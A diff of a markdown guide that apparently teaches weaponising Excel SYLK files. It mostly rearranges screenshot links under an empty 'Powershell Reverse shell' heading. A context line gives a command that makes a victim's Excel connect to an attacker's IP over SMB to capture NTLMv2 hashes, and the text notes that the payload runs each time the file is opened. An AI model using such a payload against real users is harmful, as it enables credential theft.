@@ -51,12 +51,10 @@ Replace `c:\shell.cmd` with `cmd.exe /c \\IP\IPC$`. Please make sure the IP is y
 
 Once the file.slk is opened the user will need to click on `Enable Content`. Once the user clicks the button the payload is executed. Once the button is clicked Excel, every time after that the payload will be executed when the file is openned (Unless the files is renamed).
 
-![](excel_NTLMv2_hash.gif)
-
-
+![](excel_NTLMv2_hash_capture.gif)
 
 ### Excel RCE - Powershell Reverse shell
-![](excel_NTLMv2_hash_capture.gif)
+
 
 
 More on [Symbolic Link](https://en.wikipedia.org/wiki/SYmbolic_LinK_(SYLK)) files
